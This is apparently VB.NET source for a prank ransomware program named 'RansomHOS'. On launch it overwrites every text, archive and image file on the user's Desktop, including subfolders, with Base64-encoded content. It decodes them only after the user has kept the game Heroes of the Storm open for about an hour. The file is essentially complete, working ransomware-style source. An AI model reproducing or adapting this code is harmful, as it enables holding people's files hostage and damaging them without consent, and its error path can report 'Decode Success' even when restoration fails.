﻿Imports System.IO

Public Class Form1
    Dim encodedText As String
    Dim decodedBytes As Byte()
    Dim HoSCheck As IntPtr
    Dim Time As Integer
    Dim DesktopPath As String = CreateObject("WScript.Shell").specialfolders("Desktop")

    Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As IntPtr

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Shell("explorer.exe https://github.com/Nyannnnnng/RansomHOS")
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Shell("explorer.exe http://kr.battle.net/heroes/ko/")
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        For Each Cfilefoundtxt As String In My.Computer.FileSystem.GetFiles(DesktopPath, FileIO.SearchOption.SearchAllSubDirectories, "*.txt")
            Dim data() As Byte = File.ReadAllBytes(Cfilefoundtxt)
            encodedText = Convert.ToBase64String(data)
            File.WriteAllText(Cfilefoundtxt, encodedText)
        Next
        For Each Cfilefoundzip As String In My.Computer.FileSystem.GetFiles(DesktopPath, FileIO.SearchOption.SearchAllSubDirectories, "*.zip")
            Dim data() As Byte = File.ReadAllBytes(Cfilefoundzip)
            encodedText = Convert.ToBase64String(data)
            File.WriteAllText(Cfilefoundzip, encodedText)
        Next
        For Each Cfilefound7z As String In My.Computer.FileSystem.GetFiles(DesktopPath, FileIO.SearchOption.SearchAllSubDirectories, "*.7z")
            Dim data() As Byte = File.ReadAllBytes(Cfilefound7z)
            encodedText = Convert.ToBase64String(data)
            File.WriteAllText(Cfilefound7z, encodedText)
        Next
        For Each Cfilefoundjpg As String In My.Computer.FileSystem.GetFiles(DesktopPath, FileIO.SearchOption.SearchAllSubDirectories, "*.jpg")
            Dim data() As Byte = File.ReadAllBytes(Cfilefoundjpg)
            encodedText = Convert.ToBase64String(data)
            File.WriteAllText(Cfilefoundjpg, encodedText)
        Next
        For Each Cfilefoundpng As String In My.Computer.FileSystem.GetFiles(DesktopPath, FileIO.SearchOption.SearchAllSubDirectories, "*.png")
            Dim data() As Byte = File.ReadAllBytes(Cfilefoundpng)
            encodedText = Convert.ToBase64String(data)
            File.WriteAllText(Cfilefoundpng, encodedText)
        Next
        For Each Cfilefoundgif As String In My.Computer.FileSystem.GetFiles(DesktopPath, FileIO.SearchOption.SearchAllSubDirectories, "*.gif")
            Dim data() As Byte = File.ReadAllBytes(Cfilefoundgif)
            encodedText = Convert.ToBase64String(data)
            File.WriteAllText(Cfilefoundgif, encodedText)
        Next
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        HoSCheck = FindWindow("Heroes of the Storm", "히어로즈 오브 더 스톰")
        If HoSCheck Then
            Time = Time + 1
            If Time >= 3600 Then
                On Error GoTo Err
                For Each Dfilefoundtxt As String In My.Computer.FileSystem.GetFiles(DesktopPath, FileIO.SearchOption.SearchAllSubDirectories, "*.txt")
                    Dim data As String = File.ReadAllText(Dfilefoundtxt)
                    decodedBytes = Convert.FromBase64String(data)
                    File.WriteAllBytes(Dfilefoundtxt, decodedBytes)
                Next
                For Each Dfilefoundzip As String In My.Computer.FileSystem.GetFiles(DesktopPath, FileIO.SearchOption.SearchAllSubDirectories, "*.zip")
                    Dim data As String = File.ReadAllText(Dfilefoundzip)
                    decodedBytes = Convert.FromBase64String(data)
                    File.WriteAllBytes(Dfilefoundzip, decodedBytes)
                Next
                For Each Dfilefound7z As String In My.Computer.FileSystem.GetFiles(DesktopPath, FileIO.SearchOption.SearchAllSubDirectories, "*.7z")
                    Dim data As String = File.ReadAllText(Dfilefound7z)
                    decodedBytes = Convert.FromBase64String(data)
                    File.WriteAllBytes(Dfilefound7z, decodedBytes)
                Next
                For Each Dfilefoundjpg As String In My.Computer.FileSystem.GetFiles(DesktopPath, FileIO.SearchOption.SearchAllSubDirectories, "*.jpg")
                    Dim data As String = File.ReadAllText(Dfilefoundjpg)
                    decodedBytes = Convert.FromBase64String(data)
                    File.WriteAllBytes(Dfilefoundjpg, decodedBytes)
                Next
                For Each Dfilefoundpng As String In My.Computer.FileSystem.GetFiles(DesktopPath, FileIO.SearchOption.SearchAllSubDirectories, "*.png")
                    Dim data As String = File.ReadAllText(Dfilefoundpng)
                    decodedBytes = Convert.FromBase64String(data)
                    File.WriteAllBytes(Dfilefoundpng, decodedBytes)
                Next
                For Each Dfilefoundgif As String In My.Computer.FileSystem.GetFiles(DesktopPath, FileIO.SearchOption.SearchAllSubDirectories, "*.gif")
                    Dim data As String = File.ReadAllText(Dfilefoundgif)
                    decodedBytes = Convert.FromBase64String(data)
                    File.WriteAllBytes(Dfilefoundgif, decodedBytes)
                Next
                Timer1.Enabled = False
Err:
                MsgBox("Decode Success")
            End If
        End If
    End Sub
End Class
